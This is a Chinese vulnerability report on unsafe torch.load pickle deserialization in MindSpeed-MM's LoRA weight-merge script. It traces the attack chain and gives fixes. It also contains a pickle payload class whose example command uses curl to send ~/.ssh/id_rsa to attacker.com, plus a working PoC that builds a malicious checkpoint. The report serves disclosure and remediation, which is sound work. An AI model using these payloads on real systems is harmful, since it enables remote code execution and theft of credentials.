# checkpoint-vuln-003：LoRA模型合并torch.load无保护致Pickle反序列化RCE

**严重性**: High | **CWE**: CWE-502 | **置信度**: 90/100
**位置**: `checkpoint/common/merge_base_lora_weight.py:88-92` @ `merge_model`

---

## 1. 漏洞细节

该漏洞位于 MindSpeed-MM 的 LoRA 模型合并脚本中。`merge_model()` 函数在合并基础模型权重和 LoRA 权重时，使用 `torch.load()` 加载两个 checkpoint 文件，且未设置 `weights_only=True` 参数。

**核心问题**：
- `torch.load()` 使用 pickle 反序列化 `.pt` 文件
- `weights_only=False`（默认行为）允许执行任意 Python 代码
- 两个 checkpoint 文件路径（`base_pt_path` 和 `lora_pt_path`）均来自命令行参数
- 攻击者可提供恶意的基础模型或 LoRA checkpoint 实现代码执行

**漏洞位置**：
- 第 88 行：`torch.load(base_pt_path, ...)` - 加载基础模型
- 第 89/92 行：`torch.load(lora_pt_path, ...)` - 加载 LoRA 模型

## 2. 漏洞代码

### 文件: `checkpoint/common/merge_base_lora_weight.py`

```python
"""
lora模型合并脚本，将基础模型权重和LoRA权重进行合并，生成新的权重文件。

保存lora权重目录:
your_ckpt_path_to_save
├── iter_0005000
│   └── mp_rank_00
│       └── model_optim_rng.pt
└── latest_checkpointed_iteration.txt
...
"""

import argparse
import os
import stat
from pathlib import Path

import mindspeed.megatron_adaptor
import torch
import torch_npu

from checkpoint.common.permissions import set_directory_permissions


def get_latest_iteration(path: Path) -> str:
    """从指定路径读取最新的迭代号."""
    latest_txt = path.joinpath("latest_checkpointed_iteration.txt")
    return latest_txt.read_text().strip() if latest_txt.exists() else 'release'


def save_latest_checkpointed_iteration(save_dir: str, iteration: str):
    """保存最新的迭代号到指定目录."""
    flags = os.O_WRONLY | os.O_CREAT
    mode = stat.S_IWUSR | stat.S_IRUSR
    with os.fdopen(os.open(os.path.join(save_dir, 'latest_checkpointed_iteration.txt'), flags, mode), 'w') as fout:
        fout.write(iteration)


def merge_model(base_dir: str, lora_dir: str, save_dir: str, pp_size, tp_size: int = 1):
    # 获取基础模型和LoRA模型的迭代号
    base_save_dir = Path(base_dir)
    base_iteration = get_latest_iteration(base_save_dir)
    base_save_dir = base_save_dir.joinpath(f"iter_{int(base_iteration):07}" if base_iteration != "release" else base_iteration)

    lora_save_dir = Path(lora_dir)
    lora_iteration = get_latest_iteration(lora_save_dir)
    lora_save_dir = lora_save_dir.joinpath(f"iter_{int(lora_iteration):07}" if lora_iteration != "release" else lora_iteration)

    # 保存最新的迭代号
    save_latest_checkpointed_iteration(save_dir, 'release')

    # 遍历每个 TP 和 PP 组合进行模型合并
    for tp_rank in range(tp_size):
        for pp_rank in range(pp_size):
            # 构建文件路径
            if pp_size > 1:
                base_current_path = base_save_dir.joinpath(f"mp_rank_{int(tp_rank):02}_{int(pp_rank):03}")
                lora_current_path = lora_save_dir.joinpath(f"mp_rank_{int(tp_rank):02}_{int(pp_rank):03}")
                save_pt_path = os.path.join(save_dir, 'release', f"mp_rank_{int(tp_rank):02}_{int(pp_rank):03}", 'model_optim_rng.pt')
                rank_info = f"mp_rank_{int(tp_rank):02}_{int(pp_rank):03}"
            else:
                base_current_path = base_save_dir.joinpath(f"mp_rank_{int(tp_rank):02}")
                lora_current_path = lora_save_dir.joinpath(f"mp_rank_{int(tp_rank):02}")
                save_pt_path = os.path.join(save_dir, 'release', f"mp_rank_{int(tp_rank):02}", 'model_optim_rng.pt')
                rank_info = f"mp_rank_{int(tp_rank):02}"
            base_pt_path = base_current_path.joinpath("model_optim_rng.pt")
            lora_pt_path = lora_current_path.joinpath("model_optim_rng.pt")

            print(f"Base model path: {base_pt_path}".center(100, '_'))
            print(f"Lora model path: {lora_pt_path}".center(100, '_'))

            # ⚠️ 漏洞点：加载模型权重 - 第 86-92 行
            if use_npu:
                # ⚠️ 第 88 行：不安全反序列化
                base_state_dict = torch.load(base_pt_path, map_location='npu')['model']
                # ⚠️ 第 89 行：不安全反序列化
                lora_state_dict = torch.load(lora_pt_path, map_location='npu')['model']
            else:
                # ⚠️ 第 91 行：不安全反序列化
                base_state_dict = torch.load(base_pt_path, map_location='cpu')['model']
                # ⚠️ 第 92 行：不安全反序列化
                lora_state_dict = torch.load(lora_pt_path, map_location='cpu')['model']

            # 合并权重
            print(f"Merging Base model and Lora model in {rank_info}...")
            merge_state_dict = lora_merge_to_base(base_state_dict, lora_state_dict, lora_target_modules, scaling)
            ...


def get_args():
    parser = argparse.ArgumentParser()
    # ⚠️ 漏洞入口：CLI 参数直接控制 checkpoint 路径
    parser.add_argument("--base_save_dir", type=str, default="./your_converted_ckpt_dir/", help="Source path of checkpoint")
    parser.add_argument("--lora_save_dir", type=str, default="./your_lora_ckpt_path_to_save/", help="Source path of checkpoint")
    parser.add_argument("--merge_save_dir", type=str, default="./your_ckpt_path_to_merge_saved/", help="...")
    parser.add_argument("--lora_target_modules", type=str, nargs='+', help="The lora target modules")
    parser.add_argument("--lora_alpha", type=int, default=16, ...)
    parser.add_argument("--lora_r", type=int, default=8, ...)
    parser.add_argument("--pp_size", type=int, default=1, ...)
    parser.add_argument("--tp_size", type=int, default=1, ...)

    args = parser.parse_args()
    return args


if __name__ == '__main__':
    args = get_args()

    base_save_dir = args.base_save_dir      # ⚠️ 来自 CLI，用户可控
    lora_save_dir = args.lora_save_dir      # ⚠️ 来自 CLI，用户可控
    merge_save_dir = args.merge_save_dir
    lora_target_modules = args.lora_target_modules

    ...

    merge_model(base_save_dir, lora_save_dir, merge_save_dir, pp_size, tp_size)
    ...
```

**代码分析**：

1. **参数来源**：
   - `--base_save_dir` 和 `--lora_save_dir` 直接从命令行参数获取
   - 用户可以指定任意目录路径
   - 没有路径验证或白名单机制

2. **路径构建**：
   - `base_pt_path = base_current_path.joinpath("model_optim_rng.pt")`
   - `lora_pt_path = lora_current_path.joinpath("model_optim_rng.pt")`
   - 两个路径都基于用户可控的 `base_dir` 和 `lora_dir`

3. **危险调用**：
   - 四处 `torch.load()` 调用都缺少 `weights_only=True`
   - 如果 `use_npu=True`，使用 NPU 设备加载（第 88-89 行）
   - 如果 `use_npu=False`，使用 CPU 加载（第 91-92 行）

## 3. 完整攻击链路

```
[入口点] CLI 参数 --base_save_dir / --lora_save_dir
↓ argparse 解析
[中间步骤1] get_args() → args.base_save_dir, args.lora_save_dir
↓ 参数传递到 merge_model()
[中间步骤2] merge_model(base_dir, lora_dir, ...)@merge_base_lora_weight.py:53
↓ 构建 checkpoint 目录路径
[中间步骤3] base_pt_path/lora_pt_path = ...joinpath("model_optim_rng.pt")
↓ 构建 checkpoint 文件路径
[漏洞触发] torch.load(base_pt_path/lora_pt_path, weights_only=False)
↓ pickle 反序列化执行恶意代码
[攻击结果] 任意代码执行 (RCE)
```

## 4. 攻击场景

**攻击者画像**：
- 能提供恶意 checkpoint 文件的攻击者
- 可能是 LoRA 模型提供者、基础模型分享者

**攻击向量**：
- 通过分享包含恶意 payload 的基础模型或 LoRA 权重文件
- 通过邮件、共享存储、模型仓库等方式分发

**利用难度**：低

### 攻击步骤

1. **构造恶意 checkpoint**：
   ```python
   import torch
   import os
   import subprocess
   
   class MaliciousPayload:
       def __reduce__(self):
           # 执行恶意命令
           # 实际攻击会更隐蔽
           cmd = 'curl https://attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)'
           return (subprocess.Popen, (['bash', '-c', cmd],))
   
   malicious_checkpoint = {
       'model': {
           'layer.weight': torch.randn(100, 100),
           'lora_A.default.weight': MaliciousPayload(),  # 嵌入 payload
       }
   }
   torch.save(malicious_checkpoint, 'model_optim_rng.pt')
   ```

2. **构建目录结构**：
   ```bash
   mkdir -p malicious_lora/release/mp_rank_00
   mv model_optim_rng.pt malicious_lora/release/mp_rank_00/
   echo "release" > malicious_lora/latest_checkpointed_iteration.txt
   ```

3. **诱导用户执行合并**：
   ```bash
   # 用户执行 LoRA 合并脚本
   python checkpoint/common/merge_base_lora_weight.py \
       --base_save_dir ./legitimate_base \
       --lora_save_dir ./malicious_lora \
       --merge_save_dir ./output
   
   # 恶意代码被执行，SSH 密钥被窃取
   ```

### 攻击变体

**场景 A：恶意基础模型**
- 攻击者分享包含 payload 的"高性能基础模型"
- 用户下载并使用该模型作为 LoRA 合并的基础

**场景 B：恶意 LoRA 权重**
- 攻击者分享声称能提升性能的 LoRA 微调权重
- 用户将该 LoRA 权重与自己的基础模型合并
- 合并过程中恶意代码被执行

## 5. 攻击条件

| 条件类型   | 要求             | 说明                                            |
| ---------- | ---------------- | ----------------------------------------------- |
| 网络可达性 | 不需要           | 攻击通过本地文件触发                            |
| 认证要求   | 不需要           | 任何能执行脚本的用户                            |
| 配置依赖   | 默认配置         | 漏洞存在于默认代码                              |
| 环境依赖   | PyTorch + NPU    | 需要 torch 和 torch_npu 环境                    |
| 时序条件   | 用户执行合并操作 | 需要用户主动运行 merge_base_lora_weight.py      |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                   |
| -------- | ---- | ------------------------------------------------------ |
| 机密性   | 高   | 可窃取 SSH 密钥、API 凭证、训练数据、模型权重          |
| 完性性   | 高   | 可修改合并后的模型、植入后门到输出权重                 |
| 可用性   | 高   | 可破坏合并过程、删除文件                               |

**特殊影响 - 模型供应链攻击**：
- 合并后的模型可能被用于生产推理服务
- 如果恶意 payload 在合并时植入后门，后门模型将影响所有下游用户
- 这是一种隐蔽的供应链攻击方式

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用

### PoC 脚本

```python
#!/usr/bin/env python3
"""
PoC for checkpoint-vuln-003
构造恶意 LoRA checkpoint 文件
仅供安全研究使用
"""
import torch
import os
import sys

class MaliciousPayload:
    """恶意 payload 类"""
    def __reduce__(self):
        # 安全验证用 payload
        return (
            os.system,
            ('echo "[checkpoint-vuln-003] LoRA RCE Triggered!" && id',)
        )

def create_malicious_lora_checkpoint():
    """创建恶意 LoRA checkpoint"""
    # 正常 LoRA 权重结构（伪装）
    lora_weights = {
        'layers.0.attention.lora_A.default.weight': torch.randn(8, 512),
        'layers.0.attention.lora_B.default.weight': torch.randn(512, 8),
        'layers.1.attention.lora_A.default.weight': torch.randn(8, 512),
        'layers.1.attention.lora_B.default.weight': torch.randn(512, 8),
    }
    
    # 添加恶意 payload（伪装成普通权重）
    lora_weights['layers.0.malicious_trigger'] = MaliciousPayload()
    
    checkpoint = {
        'model': lora_weights,
        'iteration': 5000,
    }
    
    return checkpoint

def setup_lora_dir(output_dir='malicious_lora'):
    """设置 LoRA checkpoint 目录结构"""
    checkpoint_path = os.path.join(output_dir, 'release', 'mp_rank_00')
    os.makedirs(checkpoint_path, exist_ok=True)
    
    # 生成并保存恶意 checkpoint
    checkpoint = create_malicious_lora_checkpoint()
    pt_file = os.path.join(checkpoint_path, 'model_optim_rng.pt')
    torch.save(checkpoint, pt_file)
    
    # 创建迭代号文件
    with open(os.path.join(output_dir, 'latest_checkpointed_iteration.txt'), 'w') as f:
        f.write('release')
    
    print(f"[+] Malicious LoRA checkpoint created: {output_dir}")
    print(f"[+] PT file: {pt_file}")
    return output_dir

if __name__ == '__main__':
    output_dir = sys.argv[1] if len(sys.argv) > 1 else 'malicious_lora'
    setup_lora_dir(output_dir)
    
    print("\n[!] To trigger the vulnerability, run:")
    print(f"    python checkpoint/common/merge_base_lora_weight.py")
    print(f"        --base_save_dir <legitimate_base>")
    print(f"        --lora_save_dir {output_dir}")
    print(f"        --merge_save_dir <output_dir>")
    print(f"        --lora_target_modules attention")
```

### 验证步骤

```bash
# 1. 生成恶意 LoRA checkpoint
python poc_checkpoint_vuln_003.py ./test_lora

# 2. 准备合法的基础模型（或创建一个简单的测试模型）
mkdir -p legitimate_base/release/mp_rank_00
python -c "
import torch
torch.save({'model': {'weight': torch.randn(10,10)}}, 'legitimate_base/release/mp_rank_00/model_optim_rng.pt')
"
echo "release" > legitimate_base/latest_checkpointed_iteration.txt

# 3. 执行合并脚本
cd /path/to/MindSpeed-MM
python checkpoint/common/merge_base_lora_weight.py \
    --base_save_dir ./legitimate_base \
    --lora_save_dir ./test_lora \
    --merge_save_dir ./merged_output \
    --lora_target_modules attention \
    --lora_alpha 16 \
    --lora_r 8

# 4. 预期输出
# 控制台应显示: "[checkpoint-vuln-003] LoRA RCE Triggered!"
```

**预期结果**：恶意 payload 在加载 LoRA checkpoint 时被执行。

## 8. 验证环境搭建

### 基础环境

- 操作系统: Linux (Ubuntu 20.04+)
- Python: 3.8+
- PyTorch: 2.0+
- torch_npu: 如果使用 NPU（可选）
- 项目依赖: 按 requirements.txt 安装

### 构建步骤

```bash
git clone <project_url>
cd MindSpeed-MM
pip install -r requirements.txt
pip install torch
# 如果使用 NPU: pip install torch_npu
```

### 验证步骤

1. 使用 PoC 脚本生成恶意 LoRA checkpoint
2. 准备一个简单的基础模型 checkpoint
3. 执行合并脚本
4. 检查是否触发 payload 执行

### 预期结果

- 控制台输出恶意 payload 执行结果
- 确认漏洞可被触发

---

## 9. 修复建议

### 紧急修复

**方案 1：设置 weights_only=True**

```python
# 修改 checkpoint/common/merge_base_lora_weight.py

# 原代码（第 86-92 行）：
if use_npu:
    base_state_dict = torch.load(base_pt_path, map_location='npu')['model']
    lora_state_dict = torch.load(lora_pt_path, map_location='npu')['model']
else:
    base_state_dict = torch.load(base_pt_path, map_location='cpu')['model']
    lora_state_dict = torch.load(lora_pt_path, map_location='cpu')['model']

# 修复后：
if use_npu:
    base_state_dict = torch.load(base_pt_path, map_location='npu', weights_only=True)['model']
    lora_state_dict = torch.load(lora_pt_path, map_location='npu', weights_only=True)['model']
else:
    base_state_dict = torch.load(base_pt_path, map_location='cpu', weights_only=True)['model']
    lora_state_dict = torch.load(lora_pt_path, map_location='cpu', weights_only=True)['model']
```

### 推荐修复方案

**方案 2：添加路径验证和哈希校验**

```python
import hashlib
from pathlib import Path

def validate_checkpoint_dir(ckpt_dir: Path, allowed_dirs: list):
    """验证 checkpoint 目录是否合法"""
    real_path = ckpt_dir.resolve()
    for allowed in allowed_dirs:
        if str(real_path).startswith(str(Path(allowed).resolve())):
            return True
    raise ValueError(f"Checkpoint directory not allowed: {ckpt_dir}")

def compute_checkpoint_hash(pt_path: Path) -> str:
    """计算 checkpoint 文件哈希"""
    with open(pt_path, 'rb') as f:
        return hashlib.sha256(f.read()).hexdigest()

def merge_model(base_dir: str, lora_dir: str, save_dir: str, pp_size, tp_size: int = 1):
    # 路径验证
    validate_checkpoint_dir(Path(base_dir), ['/opt/models', '/data/checkpoints'])
    validate_checkpoint_dir(Path(lora_dir), ['/opt/models', '/data/checkpoints'])
    
    # 加载 checkpoint（安全模式）
    base_state_dict = torch.load(base_pt_path, map_location='cpu', weights_only=True)['model']
    lora_state_dict = torch.load(lora_pt_path, map_location='cpu', weights_only=True)['model']
    ...
```

**方案 3：使用 safetensors 格式**

```python
from safetensors.torch import load_file

def safe_load_checkpoint(pt_path: Path):
    """安全加载 checkpoint"""
    safe_path = pt_path.with_suffix('.safetensors')
    if safe_path.exists():
        return load_file(safe_path)
    
    # 降级到 weights_only=True
    return torch.load(pt_path, map_location='cpu', weights_only=True)
```

### 长期建议

1. **格式迁移**：将所有 checkpoint 转换为 safetensors 格式
2. **来源验证**：建立可信 checkpoint 来源白名单
3. **安全审计**：扫描项目中所有 `torch.load()` 调用
4. **用户教育**：文档中警告不要加载不明来源的 checkpoint
5. **供应链安全**：对分享的 LoRA 权重进行安全检查